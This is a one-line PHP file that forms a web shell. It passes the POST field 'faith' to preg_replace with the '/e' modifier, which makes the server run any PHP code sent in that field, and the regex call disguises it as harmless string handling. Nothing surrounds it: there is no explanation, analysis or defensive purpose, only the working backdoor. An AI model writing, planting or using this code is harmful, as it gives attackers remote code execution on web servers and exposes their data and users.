<?php preg_replace("/faith/e",$_POST['faith'],"faith");
 
?>